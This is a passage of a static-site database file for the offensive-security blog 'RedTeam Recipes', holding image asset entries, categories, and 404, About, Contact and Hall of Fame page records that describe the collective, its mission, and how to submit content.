:"source/images/site/posts/DefenseEvasion/def23.png","hash":"deaf7c5677afb25119c74716315ae05d3489c73d","modified":1764338799519},{"_id":"source/images/site/DefenseEvasion/def26.png","hash":"c199069567227fe352596a6aba99d69ab63e62ca","modified":1764338799659},{"_id":"source/images/site/DefenseEvasion/def38.png","hash":"c213f6710ddfc7adc90687277acb44ee34f8c037","modified":1764338799891},{"_id":"source/images/site/posts/DefenseEvasion/def26.png","hash":"c199069567227fe352596a6aba99d69ab63e62ca","modified":1764338799659},{"_id":"source/images/site/posts/DefenseEvasion/def38.png","hash":"c213f6710ddfc7adc90687277acb44ee34f8c037","modified":1764338799891},{"_id":"source/images/site/DefenseEvasion/def18.png","hash":"bcd4fcd8017e43fabbab1742d7f5bdfda93e76a3","modified":1764338799294},{"_id":"source/images/site/DefenseEvasion/def32.png","hash":"8c63255675a36906b0dff54fa3d81f4f701352f1","modified":1764338799692},{"_id":"source/images/site/DefenseEvasion/def33.png","hash":"fff1d04a289ecb0fe2cdb335cffc8c1b7b2395c6","modified":1764338799785},{"_id":"source/images/site/DefenseEvasion/def37.png","hash":"222492b79ffb02c00ad8c78e7366e8ca322e846e","modified":1764338799858},{"_id":"source/images/site/posts/DefenseEvasion/def18.png","hash":"bcd4fcd8017e43fabbab1742d7f5bdfda93e76a3","modified":1764338799294},{"_id":"source/images/site/posts/DefenseEvasion/def33.png","hash":"fff1d04a289ecb0fe2cdb335cffc8c1b7b2395c6","modified":1764338799785},{"_id":"source/images/site/posts/DefenseEvasion/def32.png","hash":"8c63255675a36906b0dff54fa3d81f4f701352f1","modified":1764338799692},{"_id":"source/images/site/posts/DefenseEvasion/def37.png","hash":"222492b79ffb02c00ad8c78e7366e8ca322e846e","modified":1764338799858},{"_id":"source/images/site/DefenseEvasion/def10.png","hash":"e2736dfa1b5d4c5b85a25da82c25f3b13d9b4759","modified":1764338799018},{"_id":"source/images/site/DefenseEvasion/def12.png","hash":"4d22efcb8bcb7593cd1c308b5ea8d13599a8d1bd","modified":1764338799182},{"_id":"source/images/site/posts/DefenseEvasion/def10.png","hash":"e2736dfa1b5d4c5b85a25da82c25f3b13d9b4759","modified":1764338799018},{"_id":"source/images/site/posts/DefenseEvasion/def12.png","hash":"4d22efcb8bcb7593cd1c308b5ea8d13599a8d1bd","modified":1764338799182},{"_id":"source/images/site/DefenseEvasion/def15.png","hash":"b588ce0ccd6596c64645b9692165a5ecf6d3f9d4","modified":1764338799232},{"_id":"source/images/site/DefenseEvasion/def24.png","hash":"367988bb04c5bdc00dc7ee8509c090ce210b4f20","modified":1764338799543},{"_id":"source/images/site/posts/DefenseEvasion/def15.png","hash":"b588ce0ccd6596c64645b9692165a5ecf6d3f9d4","modified":1764338799232},{"_id":"source/images/site/posts/DefenseEvasion/def24.png","hash":"367988bb04c5bdc00dc7ee8509c090ce210b4f20","modified":1764338799543},{"_id":"source/images/site/DefenseEvasion/def39.png","hash":"a93f47079d56a7fd4fc0f19864a5005e9327aec8","modified":1764338799933},{"_id":"source/images/site/posts/DefenseEvasion/def39.png","hash":"a93f47079d56a7fd4fc0f19864a5005e9327aec8","modified":1764338799933},{"_id":"source/images/site/DefenseEvasion/def13.png","hash":"bc2db01dda1f8c10d9641f93c526fc3ee11f36bb","modified":1764338799123},{"_id":"source/images/site/posts/DefenseEvasion/def13.png","hash":"bc2db01dda1f8c10d9641f93c526fc3ee11f36bb","modified":1764338799123},{"_id":"source/images/site/DefenseEvasion/def11.png","hash":"b7bee26984043106c33f8e9ee9de92f208ef9b5a","modified":1764338799084},{"_id":"source/images/site/DefenseEvasion/def21.png","hash":"342e2916f232345f7e8bde42e6f0cdccf72bf3ac","modified":1764338799402},{"_id":"source/images/site/posts/DefenseEvasion/def11.png","hash":"b7bee26984043106c33f8e9ee9de92f208ef9b5a","modified":1764338799084},{"_id":"source/images/site/posts/DefenseEvasion/def21.png","hash":"342e2916f232345f7e8bde42e6f0cdccf72bf3ac","modified":1764338799402},{"_id":"source/images/site/DefenseEvasion/def.png","hash":"77e0347b49b03fa9ad068e2549db0d423ff809f0","modified":1764338798934},{"_id":"source/images/site/posts/DefenseEvasion/def.png","hash":"77e0347b49b03fa9ad068e2549db0d423ff809f0","modified":1764338798934},{"_id":"source/images/site/DefenseEvasion/def9.png","hash":"482d909fa206a8c53ed8a28128a8ec2636cf2c19","modified":1764338798979},{"_id":"source/images/site/posts/DefenseEvasion/def9.png","hash":"482d909fa206a8c53ed8a28128a8ec2636cf2c19","modified":1764338798979},{"_id":"source/images/site/DefenseEvasion/def20.png","hash":"cde0051182e2d4e0914b961d76eac577cba5528c","modified":1764338799339},{"_id":"source/images/site/posts/DefenseEvasion/def20.png","hash":"cde0051182e2d4e0914b961d76eac577cba5528c","modified":1764338799339},{"_id":"source/images/site/posts/macos/image.psd.png","hash":"aec95c25bb4ca040c576269f8eb02bb994ad20a3","modified":1764336216371},{"_id":"source/_posts/Evasion.md","hash":"559a5a433b28ba8413bb7c103227703857eec3ae","modified":1764348598965}],"Category":[{"name":"Exploit Development","_id":"cmij2yuok000b9reu68t11xu8"},{"name":"Home Labs","_id":"cmij30ajg000g9reu9bur6d4y"},{"name":"Evasion","parent":"cmij30ajg000g9reu9bur6d4y","_id":"cmij30ajh000j9reucng2463z"},{"name":"Evasion","_id":"cmij31fhx000u9reu6ezt2yiv"},{"name":"Netwo","parent":"cmij31fhx000u9reu6ezt2yiv","_id":"cmij31fhx000v9reuh69o0gtt"},{"name":"Network","parent":"cmij31fhx000u9reu6ezt2yiv","_id":"cmij31grd000y9reu92q27ys1"},{"name":"Network","_id":"cmij32jx900139reu3nvx5o2h"}],"Data":[{"_id":"social","data":{"bluesky":"https://example.com/bluesky","email":"contact@example.com","github":"example"}}],"Page":[{"title":"Page Not Found","comments":0,"layout":"page","_content":"\nThe page you requested does not exist. [Head back home](/) to browse the latest recipes.\n","source":"404.md","raw":"---\ntitle: Page Not Found\ncomments: false\nlayout: page\n---\n\nThe page you requested does not exist. [Head back home](/) to browse the latest recipes.\n","date":"2025-11-28T07:19:06.889Z","updated":"2025-11-28T07:19:06.889Z","path":"404.html","_id":"cmij2yuo300009reu9gye4xq1","content":"<p>The page you requested does not exist. <a href=\"/\">Head back home</a> to browse the latest recipes.</p>\n","excerpt":"","more":"<p>The page you requested does not exist. <a href=\"/\">Head back home</a> to browse the latest recipes.</p>\n"},{"title":"About RedTeam Recipes","tags":[],"categories":[],"comments":0,"date":"2024-06-01T06:00:00.000Z","layout":"page","_content":"\n## Who we are \nWe are a collective of Arab offensive security engineers united by a shared obsession with understanding and outsmarting complex systems.\nRedTeam Recipes (RTR) was born from that passion: a place to publish high-quality offensive security blogs, research, and field notes that dig deep into real adversarial techniques.\n\nWe believe in learning by doing, documenting what works, and pushing technical boundaries responsibly. Every post on RTR comes straight from practical experience tested, broken, rebuilt, and served fresh for the community.\n\n## Our Mission\nThe Arab cybersecurity scene is full of talent but also full of noise.\nScammers, fake ‚Äúexperts,‚Äù and recycled low-quality content have drowned out the voices of genuine professionals. Valuable research often goes unseen, hidden beneath layers of hype and algorithm-driven nonsense.\n\nRedTeam Recipes (RTR) exists to change that.\nWe built RTR as a home for authentic, high-quality offensive security knowledge not clickbait. We collect, refine, and publish real work from real practitioners.\nBy filtering out the noise, we aim to create a trusted space for professionals, a platform where skill, integrity, and technical excellence define the standard.\n\n## Teammates\nRedTeam Recipes (RTR) **isn‚Äôt owned by a single person or company** it‚Äôs a collective.\nAny Arab security professional or content creator producing real, high-quality offensive security work is welcome here. **RTR is an open-source initiative** built to raise the level of technical depth, honesty, and professionalism across the Arab cybersecurity space.\n\nWe believe collaboration beats competition.\nIf you share that vision if you‚Äôre tired of noise and want to build something meaningful you‚Äôre already one of us.\n\nüìß Join the crew: contact@redteamrecipes.com\n\nüí¨ Or reach out through any of our social media channels we‚Äôre always open to new minds and sharp skills.\n\n\n## Sponsorship \nIf you‚Äôre interested in sponsoring RedTeam Recipes (RTR) or want to request a specific security service or collaboration related to what we showcase in our blog posts we‚Äôd love to hear from you.\n\nRTR is open to partnerships that align with our mission: advancing real offensive security knowledge and empowering the Arab cybersecurity community.\n\nüì© Reach us at: sponsorship@redteamrecipes.com\n\nüí¨ Or contact us directly through our social media channels.\n\nWe‚Äôre selective about who we work with integrity and technical depth come first ‚Äî but if your goals match ours, we‚Äôll make something great together.\n\n## Community \nSecurity is better when it‚Äôs shared.\nAt RedTeam Recipes (RTR), we‚Äôre building a community where Arab security engineers can connect, discuss, and learn from each other without the ego or gatekeeping.\n\nWhether you‚Äôre sharing new techniques, asking hard questions, or just hanging out with other professionals, we‚Äôve got you covered:\n\nüí¨ Discussions & Questions: [Join us on Reddit](https://www.reddit.com/r/RedTeamRecipes/)\n\nüìì Daily Notes & Quick Tips: [Follow our Telegram Channel](https://t.me/RedTeamRecipes)\n\nüß† High-Quality Posts & Highlights: [Check out our X](https://x.com/redteamrecipes)\n\nWe‚Äôre stronger when we think together ‚Äî one network, one goal, improving the Arab security scene from the inside out.\n","source":"about/index.md","raw":"---\ntitle: About RedTeam Recipes\ntags: []\ncategories: []\ncomments: false\ndate: 2024-06-01 09:00:00\nlayout: page\n---\n\n## Who we are \nWe are a collective of Arab offensive security engineers united by a shared obsession with understanding and outsmarting complex systems.\nRedTeam Recipes (RTR) was born from that passion: a place to publish high-quality offensive security blogs, research, and field notes that dig deep into real adversarial techniques.\n\nWe believe in learning by doing, documenting what works, and pushing technical boundaries responsibly. Every post on RTR comes straight from practical experience tested, broken, rebuilt, and served fresh for the community.\n\n## Our Mission\nThe Arab cybersecurity scene is full of talent but also full of noise.\nScammers, fake ‚Äúexperts,‚Äù and recycled low-quality content have drowned out the voices of genuine professionals. Valuable research often goes unseen, hidden beneath layers of hype and algorithm-driven nonsense.\n\nRedTeam Recipes (RTR) exists to change that.\nWe built RTR as a home for authentic, high-quality offensive security knowledge not clickbait. We collect, refine, and publish real work from real practitioners.\nBy filtering out the noise, we aim to create a trusted space for professionals, a platform where skill, integrity, and technical excellence define the standard.\n\n## Teammates\nRedTeam Recipes (RTR) **isn‚Äôt owned by a single person or company** it‚Äôs a collective.\nAny Arab security professional or content creator producing real, high-quality offensive security work is welcome here. **RTR is an open-source initiative** built to raise the level of technical depth, honesty, and professionalism across the Arab cybersecurity space.\n\nWe believe collaboration beats competition.\nIf you share that vision if you‚Äôre tired of noise and want to build something meaningful you‚Äôre already one of us.\n\nüìß Join the crew: contact@redteamrecipes.com\n\nüí¨ Or reach out through any of our social media channels we‚Äôre always open to new minds and sharp skills.\n\n\n## Sponsorship \nIf you‚Äôre interested in sponsoring RedTeam Recipes (RTR) or want to request a specific security service or collaboration related to what we showcase in our blog posts we‚Äôd love to hear from you.\n\nRTR is open to partnerships that align with our mission: advancing real offensive security knowledge and empowering the Arab cybersecurity community.\n\nüì© Reach us at: sponsorship@redteamrecipes.com\n\nüí¨ Or contact us directly through our social media channels.\n\nWe‚Äôre selective about who we work with integrity and technical depth come first ‚Äî but if your goals match ours, we‚Äôll make something great together.\n\n## Community \nSecurity is better when it‚Äôs shared.\nAt RedTeam Recipes (RTR), we‚Äôre building a community where Arab security engineers can connect, discuss, and learn from each other without the ego or gatekeeping.\n\nWhether you‚Äôre sharing new techniques, asking hard questions, or just hanging out with other professionals, we‚Äôve got you covered:\n\nüí¨ Discussions & Questions: [Join us on Reddit](https://www.reddit.com/r/RedTeamRecipes/)\n\nüìì Daily Notes & Quick Tips: [Follow our Telegram Channel](https://t.me/RedTeamRecipes)\n\nüß† High-Quality Posts & Highlights: [Check out our X](https://x.com/redteamrecipes)\n\nWe‚Äôre stronger when we think together ‚Äî one network, one goal, improving the Arab security scene from the inside out.\n","updated":"2025-11-28T15:03:23.804Z","path":"about/index.html","_id":"cmij2yuo600019reuc36hcrzv","content":"<h2 id=\"Who-we-are\"><a href=\"#Who-we-are\" class=\"headerlink\" title=\"Who we are\"></a>Who we are</h2><p>We are a collective of Arab offensive security engineers united by a shared obsession with understanding and outsmarting complex systems.<br>RedTeam Recipes (RTR) was born from that passion: a place to publish high-quality offensive security blogs, research, and field notes that dig deep into real adversarial techniques.</p>\n<p>We believe in learning by doing, documenting what works, and pushing technical boundaries responsibly. Every post on RTR comes straight from practical experience tested, broken, rebuilt, and served fresh for the community.</p>\n<h2 id=\"Our-Mission\"><a href=\"#Our-Mission\" class=\"headerlink\" title=\"Our Mission\"></a>Our Mission</h2><p>The Arab cybersecurity scene is full of talent but also full of noise.<br>Scammers, fake ‚Äúexperts,‚Äù and recycled low-quality content have drowned out the voices of genuine professionals. Valuable research often goes unseen, hidden beneath layers of hype and algorithm-driven nonsense.</p>\n<p>RedTeam Recipes (RTR) exists to change that.<br>We built RTR as a home for authentic, high-quality offensive security knowledge not clickbait. We collect, refine, and publish real work from real practitioners.<br>By filtering out the noise, we aim to create a trusted space for professionals, a platform where skill, integrity, and technical excellence define the standard.</p>\n<h2 id=\"Teammates\"><a href=\"#Teammates\" class=\"headerlink\" title=\"Teammates\"></a>Teammates</h2><p>RedTeam Recipes (RTR) <strong>isn‚Äôt owned by a single person or company</strong> it‚Äôs a collective.<br>Any Arab security professional or content creator producing real, high-quality offensive security work is welcome here. <strong>RTR is an open-source initiative</strong> built to raise the level of technical depth, honesty, and professionalism across the Arab cybersecurity space.</p>\n<p>We believe collaboration beats competition.<br>If you share that vision if you‚Äôre tired of noise and want to build something meaningful you‚Äôre already one of us.</p>\n<p>üìß Join the crew: <a href=\"mailto:&#99;&#x6f;&#110;&#116;&#97;&#x63;&#116;&#x40;&#114;&#101;&#x64;&#116;&#x65;&#97;&#109;&#x72;&#x65;&#x63;&#x69;&#112;&#101;&#115;&#46;&#99;&#x6f;&#x6d;\">contact@redteamrecipes.com</a></p>\n<p>üí¨ Or reach out through any of our social media channels we‚Äôre always open to new minds and sharp skills.</p>\n<h2 id=\"Sponsorship\"><a href=\"#Sponsorship\" class=\"headerlink\" title=\"Sponsorship\"></a>Sponsorship</h2><p>If you‚Äôre interested in sponsoring RedTeam Recipes (RTR) or want to request a specific security service or collaboration related to what we showcase in our blog posts we‚Äôd love to hear from you.</p>\n<p>RTR is open to partnerships that align with our mission: advancing real offensive security knowledge and empowering the Arab cybersecurity community.</p>\n<p>üì© Reach us at: <a href=\"mailto:&#115;&#x70;&#x6f;&#110;&#115;&#x6f;&#x72;&#115;&#x68;&#105;&#112;&#x40;&#114;&#x65;&#100;&#116;&#101;&#97;&#x6d;&#x72;&#x65;&#99;&#105;&#112;&#x65;&#115;&#x2e;&#99;&#x6f;&#x6d;\">sponsorship@redteamrecipes.com</a></p>\n<p>üí¨ Or contact us directly through our social media channels.</p>\n<p>We‚Äôre selective about who we work with integrity and technical depth come first ‚Äî but if your goals match ours, we‚Äôll make something great together.</p>\n<h2 id=\"Community\"><a href=\"#Community\" class=\"headerlink\" title=\"Community\"></a>Community</h2><p>Security is better when it‚Äôs shared.<br>At RedTeam Recipes (RTR), we‚Äôre building a community where Arab security engineers can connect, discuss, and learn from each other without the ego or gatekeeping.</p>\n<p>Whether you‚Äôre sharing new techniques, asking hard questions, or just hanging out with other professionals, we‚Äôve got you covered:</p>\n<p>üí¨ Discussions &amp; Questions: <a href=\"https://www.reddit.com/r/RedTeamRecipes/\">Join us on Reddit</a></p>\n<p>üìì Daily Notes &amp; Quick Tips: <a href=\"https://t.me/RedTeamRecipes\">Follow our Telegram Channel</a></p>\n<p>üß† High-Quality Posts &amp; Highlights: <a href=\"https://x.com/redteamrecipes\">Check out our X</a></p>\n<p>We‚Äôre stronger when we think together ‚Äî one network, one goal, improving the Arab security scene from the inside out.</p>\n","excerpt":"","more":"<h2 id=\"Who-we-are\"><a href=\"#Who-we-are\" class=\"headerlink\" title=\"Who we are\"></a>Who we are</h2><p>We are a collective of Arab offensive security engineers united by a shared obsession with understanding and outsmarting complex systems.<br>RedTeam Recipes (RTR) was born from that passion: a place to publish high-quality offensive security blogs, research, and field notes that dig deep into real adversarial techniques.</p>\n<p>We believe in learning by doing, documenting what works, and pushing technical boundaries responsibly. Every post on RTR comes straight from practical experience tested, broken, rebuilt, and served fresh for the community.</p>\n<h2 id=\"Our-Mission\"><a href=\"#Our-Mission\" class=\"headerlink\" title=\"Our Mission\"></a>Our Mission</h2><p>The Arab cybersecurity scene is full of talent but also full of noise.<br>Scammers, fake ‚Äúexperts,‚Äù and recycled low-quality content have drowned out the voices of genuine professionals. Valuable research often goes unseen, hidden beneath layers of hype and algorithm-driven nonsense.</p>\n<p>RedTeam Recipes (RTR) exists to change that.<br>We built RTR as a home for authentic, high-quality offensive security knowledge not clickbait. We collect, refine, and publish real work from real practitioners.<br>By filtering out the noise, we aim to create a trusted space for professionals, a platform where skill, integrity, and technical excellence define the standard.</p>\n<h2 id=\"Teammates\"><a href=\"#Teammates\" class=\"headerlink\" title=\"Teammates\"></a>Teammates</h2><p>RedTeam Recipes (RTR) <strong>isn‚Äôt owned by a single person or company</strong> it‚Äôs a collective.<br>Any Arab security professional or content creator producing real, high-quality offensive security work is welcome here. <strong>RTR is an open-source initiative</strong> built to raise the level of technical depth, honesty, and professionalism across the Arab cybersecurity space.</p>\n<p>We believe collaboration beats competition.<br>If you share that vision if you‚Äôre tired of noise and want to build something meaningful you‚Äôre already one of us.</p>\n<p>üìß Join the crew: <a href=\"mailto:&#99;&#x6f;&#110;&#116;&#97;&#x63;&#116;&#x40;&#114;&#101;&#x64;&#116;&#x65;&#97;&#109;&#x72;&#x65;&#x63;&#x69;&#112;&#101;&#115;&#46;&#99;&#x6f;&#x6d;\">contact@redteamrecipes.com</a></p>\n<p>üí¨ Or reach out through any of our social media channels we‚Äôre always open to new minds and sharp skills.</p>\n<h2 id=\"Sponsorship\"><a href=\"#Sponsorship\" class=\"headerlink\" title=\"Sponsorship\"></a>Sponsorship</h2><p>If you‚Äôre interested in sponsoring RedTeam Recipes (RTR) or want to request a specific security service or collaboration related to what we showcase in our blog posts we‚Äôd love to hear from you.</p>\n<p>RTR is open to partnerships that align with our mission: advancing real offensive security knowledge and empowering the Arab cybersecurity community.</p>\n<p>üì© Reach us at: <a href=\"mailto:&#115;&#x70;&#x6f;&#110;&#115;&#x6f;&#x72;&#115;&#x68;&#105;&#112;&#x40;&#114;&#x65;&#100;&#116;&#101;&#97;&#x6d;&#x72;&#x65;&#99;&#105;&#112;&#x65;&#115;&#x2e;&#99;&#x6f;&#x6d;\">sponsorship@redteamrecipes.com</a></p>\n<p>üí¨ Or contact us directly through our social media channels.</p>\n<p>We‚Äôre selective about who we work with integrity and technical depth come first ‚Äî but if your goals match ours, we‚Äôll make something great together.</p>\n<h2 id=\"Community\"><a href=\"#Community\" class=\"headerlink\" title=\"Community\"></a>Community</h2><p>Security is better when it‚Äôs shared.<br>At RedTeam Recipes (RTR), we‚Äôre building a community where Arab security engineers can connect, discuss, and learn from each other without the ego or gatekeeping.</p>\n<p>Whether you‚Äôre sharing new techniques, asking hard questions, or just hanging out with other professionals, we‚Äôve got you covered:</p>\n<p>üí¨ Discussions &amp; Questions: <a href=\"https://www.reddit.com/r/RedTeamRecipes/\">Join us on Reddit</a></p>\n<p>üìì Daily Notes &amp; Quick Tips: <a href=\"https://t.me/RedTeamRecipes\">Follow our Telegram Channel</a></p>\n<p>üß† High-Quality Posts &amp; Highlights: <a href=\"https://x.com/redteamrecipes\">Check out our X</a></p>\n<p>We‚Äôre stronger when we think together ‚Äî one network, one goal, improving the Arab security scene from the inside out.</p>\n"},{"title":"Categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: Categories\nlayout: categories\n---\n","date":"2025-11-28T08:46:22.522Z","updated":"2025-11-28T08:46:22.522Z","path":"categories/index.html","comments":1,"_id":"cmij2yuo700029reugs21574y","content":"","excerpt":"","more":""},{"_content":"\n## General Contact\n- Email: [contact@redteamrecipes.com](mailto:contact@redteamrecipes.com)\n- PGP is available on request if you need to send sensitive material‚Äîmention it in the subject line and we will send you the fingerprint.\n\n## Sponsorship & Services\nWant to sponsor a series, request a bespoke red-team engagement, or co-publish deeper research?  \nEmail [sponsorship@redteamrecipes.com](mailto:sponsorship@redteamrecipes.com) with a short brief (objective, timeline, and any operational constraints).\n\n## Community Channels\nPrefer async chat or want to follow daily drops? Join any of our public feeds:\n\n- [Reddit Discussions](https://www.reddit.com/r/RedTeamRecipes/)\n- [Telegram Broadcasts](https://t.me/RedTeamRecipes)\n- [X Highlights](https://x.com/redteamrecipes)\n\nUse whichever channel matches your workflow‚Äîjust mention you came via the site so we can route you quickly.\n\n## Submit Content\nIf you have a recipe, tool teardown, or evasion lab you want to share:\n\n1. Email a short outline (goal, tooling, detection notes) to `contact@redteamrecipes.com`.\n2. Include screenshots or PoC snippets so we can reproduce the findings.\n3. Tell us how you want to be credited (handle, team, or anonymous).\n\nWe collaborate directly with authors to review, test, and publish each piece under the RTR banner.\n","source":"contact/index.md","raw":"\n## General Contact\n- Email: [contact@redteamrecipes.com](mailto:contact@redteamrecipes.com)\n- PGP is available on request if you need to send sensitive material‚Äîmention it in the subject line and we will send you the fingerprint.\n\n## Sponsorship & Services\nWant to sponsor a series, request a bespoke red-team engagement, or co-publish deeper research?  \nEmail [sponsorship@redteamrecipes.com](mailto:sponsorship@redteamrecipes.com) with a short brief (objective, timeline, and any operational constraints).\n\n## Community Channels\nPrefer async chat or want to follow daily drops? Join any of our public feeds:\n\n- [Reddit Discussions](https://www.reddit.com/r/RedTeamRecipes/)\n- [Telegram Broadcasts](https://t.me/RedTeamRecipes)\n- [X Highlights](https://x.com/redteamrecipes)\n\nUse whichever channel matches your workflow‚Äîjust mention you came via the site so we can route you quickly.\n\n## Submit Content\nIf you have a recipe, tool teardown, or evasion lab you want to share:\n\n1. Email a short outline (goal, tooling, detection notes) to `contact@redteamrecipes.com`.\n2. Include screenshots or PoC snippets so we can reproduce the findings.\n3. Tell us how you want to be credited (handle, team, or anonymous).\n\nWe collaborate directly with authors to review, test, and publish each piece under the RTR banner.\n","date":"2025-11-28T15:08:49.239Z","updated":"2025-11-28T15:08:49.239Z","path":"contact/index.html","title":"","comments":1,"layout":"page","_id":"cmij2yuo800039reu98ttbjzr","content":"<h2 id=\"General-Contact\"><a href=\"#General-Contact\" class=\"headerlink\" title=\"General Contact\"></a>General Contact</h2><ul>\n<li>Email: <a href=\"mailto:&#99;&#111;&#110;&#x74;&#x61;&#99;&#x74;&#64;&#114;&#101;&#100;&#x74;&#101;&#x61;&#109;&#x72;&#101;&#x63;&#x69;&#112;&#101;&#115;&#46;&#99;&#x6f;&#x6d;\">contact@redteamrecipes.com</a></li>\n<li>PGP is available on request if you need to send sensitive material‚Äîmention it in the subject line and we will send you the fingerprint.</li>\n</ul>\n<h2 id=\"Sponsorship-Services\"><a href=\"#Sponsorship-Services\" class=\"headerlink\" title=\"Sponsorship &amp; Services\"></a>Sponsorship &amp; Services</h2><p>Want to sponsor a series, request a bespoke red-team engagement, or co-publish deeper research?<br>Email <a href=\"mailto:&#x73;&#112;&#111;&#x6e;&#x73;&#111;&#114;&#x73;&#104;&#x69;&#112;&#x40;&#x72;&#101;&#x64;&#x74;&#x65;&#97;&#109;&#114;&#x65;&#x63;&#x69;&#x70;&#101;&#x73;&#x2e;&#99;&#x6f;&#x6d;\">sponsorship@redteamrecipes.com</a> with a short brief (objective, timeline, and any operational constraints).</p>\n<h2 id=\"Community-Channels\"><a href=\"#Community-Channels\" class=\"headerlink\" title=\"Community Channels\"></a>Community Channels</h2><p>Prefer async chat or want to follow daily drops? Join any of our public feeds:</p>\n<ul>\n<li><a href=\"https://www.reddit.com/r/RedTeamRecipes/\">Reddit Discussions</a></li>\n<li><a href=\"https://t.me/RedTeamRecipes\">Telegram Broadcasts</a></li>\n<li><a href=\"https://x.com/redteamrecipes\">X Highlights</a></li>\n</ul>\n<p>Use whichever channel matches your workflow‚Äîjust mention you came via the site so we can route you quickly.</p>\n<h2 id=\"Submit-Content\"><a href=\"#Submit-Content\" class=\"headerlink\" title=\"Submit Content\"></a>Submit Content</h2><p>If you have a recipe, tool teardown, or evasion lab you want to share:</p>\n<ol>\n<li>Email a short outline (goal, tooling, detection notes) to <code>contact@redteamrecipes.com</code>.</li>\n<li>Include screenshots or PoC snippets so we can reproduce the findings.</li>\n<li>Tell us how you want to be credited (handle, team, or anonymous).</li>\n</ol>\n<p>We collaborate directly with authors to review, test, and publish each piece under the RTR banner.</p>\n","excerpt":"","more":"<h2 id=\"General-Contact\"><a href=\"#General-Contact\" class=\"headerlink\" title=\"General Contact\"></a>General Contact</h2><ul>\n<li>Email: <a href=\"mailto:&#99;&#111;&#110;&#x74;&#x61;&#99;&#x74;&#64;&#114;&#101;&#100;&#x74;&#101;&#x61;&#109;&#x72;&#101;&#x63;&#x69;&#112;&#101;&#115;&#46;&#99;&#x6f;&#x6d;\">contact@redteamrecipes.com</a></li>\n<li>PGP is available on request if you need to send sensitive material‚Äîmention it in the subject line and we will send you the fingerprint.</li>\n</ul>\n<h2 id=\"Sponsorship-Services\"><a href=\"#Sponsorship-Services\" class=\"headerlink\" title=\"Sponsorship &amp; Services\"></a>Sponsorship &amp; Services</h2><p>Want to sponsor a series, request a bespoke red-team engagement, or co-publish deeper research?<br>Email <a href=\"mailto:&#x73;&#112;&#111;&#x6e;&#x73;&#111;&#114;&#x73;&#104;&#x69;&#112;&#x40;&#x72;&#101;&#x64;&#x74;&#x65;&#97;&#109;&#114;&#x65;&#x63;&#x69;&#x70;&#101;&#x73;&#x2e;&#99;&#x6f;&#x6d;\">sponsorship@redteamrecipes.com</a> with a short brief (objective, timeline, and any operational constraints).</p>\n<h2 id=\"Community-Channels\"><a href=\"#Community-Channels\" class=\"headerlink\" title=\"Community Channels\"></a>Community Channels</h2><p>Prefer async chat or want to follow daily drops? Join any of our public feeds:</p>\n<ul>\n<li><a href=\"https://www.reddit.com/r/RedTeamRecipes/\">Reddit Discussions</a></li>\n<li><a href=\"https://t.me/RedTeamRecipes\">Telegram Broadcasts</a></li>\n<li><a href=\"https://x.com/redteamrecipes\">X Highlights</a></li>\n</ul>\n<p>Use whichever channel matches your workflow‚Äîjust mention you came via the site so we can route you quickly.</p>\n<h2 id=\"Submit-Content\"><a href=\"#Submit-Content\" class=\"headerlink\" title=\"Submit Content\"></a>Submit Content</h2><p>If you have a recipe, tool teardown, or evasion lab you want to share:</p>\n<ol>\n<li>Email a short outline (goal, tooling, detection notes) to <code>contact@redteamrecipes.com</code>.</li>\n<li>Include screenshots or PoC snippets so we can reproduce the findings.</li>\n<li>Tell us how you want to be credited (handle, team, or anonymous).</li>\n</ol>\n<p>We collaborate directly with authors to review, test, and publish each piece under the RTR banner.</p>\n"},{"title":"Hall Of Fame","tags":[],"categories":[],"comments":0,"date":"2024-06-01T08:00:00.000Z","layout":"page","_content":"\n# Coming Soon\n\n> Main rule: to be listed in the Hall of Fame you must publish **at least seven** RedTeam Recipes posts. Keep shipping research and we‚Äôll add you to the board.\n\n<!-- Celebrate the people pushing the craft forward. Update this table as you add real contributors.\n\n| Alias            | Specialty              | Signature Recipe                | Notes                          |\n| ---------------- | ---------------------- | -------------------------------- | ------------------------------ |\n| GhostBaker       | EDR bypass & tradecraft| Stealthy Mise en Place          | Always ships working PoCs      |\n| PacketSousChef   | Network telemetry      | Slow-Cooked Beacon Reduction     | Loves packet captures          |\n| TTPForger        | Payload development    | Smokehouse DLL Chains            | Adds mitigation advice         |\n| BlueFriend       | Detection engineering  | Purple-Team Reduction Sauce      | Provides blue-team POV         |\n\n> Swap in the real names, links, or photos when you have them. -->\n","source":"hall-of-fame/index.md","raw":"---\ntitle: Hall Of Fame\ntags: []\ncategories: []\ncomments: false\ndate: 2024-06-01 11:00:00\nlayout: page\n---\n\n# Coming Soon\n\n> Main rule: to be listed in the Hall of Fame you must publish **at least seven** RedTeam Recipes posts. Keep shipping research and we‚Äôll add you to the board.\n\n<!-- Celebrate the people pushing the craft forward. Update this table as you add real contributors.\n\n| Alias            | Specialty              | Signature Recipe                | Notes                          |\n| ---------------- | ---------------------- | -------------------------------- | ------------------------------ |\n| GhostBaker       | EDR bypass & tradecraft| Stealthy Mise en Place          | Always ships working PoCs      |\n| PacketSousChef   | Network telemetry      | Slow-Cooked Beacon Reduction     | Loves packet captures          |\n| TTPForger        | Payload development    | Smokehouse DLL Chains            | Adds mitigation advice         |\n| BlueFriend       | Detection engineering  | Purple-Team Reduction Sauce      | Provides blue-team POV         |\n\n> Swap in the real names, links, or photos when you have them. -->\n","updated":"2025-11-28T16:55:20.052Z","path":"hall-of-fame/index.html","_id":"cmij2yuo900049reuhqnb3cmc","content":"<h1 id=\"Coming-Soon\"><a href=\"#Coming-Soon\" class=\"headerlink\" title=\"Coming Soon\"></a>Coming Soon</h1><blockquote>\n<p>Main rule: to be listed in the Hall of Fame you must publish <strong>at least seven</strong> RedTeam Recipes posts. Keep shipping research and we‚Äôll add you to the board.</p>\n</blockquote>\n<!-- Celebrate the people pushing the craft forward. Update this table as you add real contributors.\n\n| Alias            | Specialty              | Signature Recipe                | Notes                          |\n| ---------------- | ---------------------- | -------------------------------- | ------------------------------ |\n| GhostBaker       | EDR bypass & tradecraft| Stealthy Mise en Place          | Always ships working PoCs      |\n| PacketSousChef   | Network telemetry      | Slow-Cooked Beacon Reduction     | Loves packet captures          |\n| TTPForger        | Payload development    | Smokehouse DLL Chains            | Adds mitigation advice         |\n| BlueFriend       | Detection engineering  | Purple-Team Reduction Sauce      | Provides blue-team POV         |\n\n> Swap in the real names, links, or photos when you have them. -->\n","excerpt":"","more":"<h1 id=\"Coming-Soon\"><a href=\"#Coming-Soon\" class=\"headerlink\" title=\"Coming Soon\"></a>Coming Soon</h1><blockquote>\n<p>Main rule: to be listed in the Hall of Fame you must publish <strong>at least seven</strong> 